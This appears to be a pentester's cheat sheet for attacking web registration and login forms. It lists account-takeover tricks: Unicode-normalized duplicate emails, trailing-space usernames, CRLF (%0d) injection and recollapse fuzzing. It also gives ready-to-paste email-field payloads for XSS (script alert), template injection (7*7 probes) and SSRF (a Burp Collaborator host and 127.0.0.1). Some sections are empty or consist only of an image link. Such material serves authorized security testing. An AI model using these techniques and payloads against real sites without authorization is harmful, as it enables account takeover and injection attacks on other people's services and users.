

                                                    **Login:**











                                                    **Register:**

1.  Unicode normalization:
Make 1 account(Zaggeb@gmail.com) and then log out.
Continue to with registering a new account with the same email, but change one of the letters in the email using:
https://gosecure.github.io/unicode-pentester-cheatsheet/

2. The space technique(Mysql varchar):

Make one account with zaggeb@yopmail.com or username zaggeb
Continue with making one more account, however do a space after the username, if that does not work. Do more spaces or try zaggeb[space]


3. The CLRF technnique

Register a first account with zaggeb@yopmail.com and complete it
Register further a new account and add %0d, example: zaggeb@yopmail.com%0d

See if it goes through.


4. The Recollapse technique (https://github.com/0xacb/recollapse)

Url encode and unicode normalization including raw format. Great for ATO, check https://github.com/0xacb/recollapse/blob/main/till_recollapse_fuzzing_the_web_for_mysterious_bugs.pdf

5. CLRF bypass:



                                                 ** Password Reset:**

<img src="https://pbs.twimg.com/media/FiRgcuUacAAUpKJ?format=jpg&name=large" alt="Alt text" title="Optional title">


**Payloads for xss,SSTI,SSRF:**

1. test+(<script>alert(0)</script>)@example.com
2. test@example(<script>alert(0)</script>).com
3. "<script>alert(0)</script>"@example.com
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com

SSTI template injection:
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com

SSRF:
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]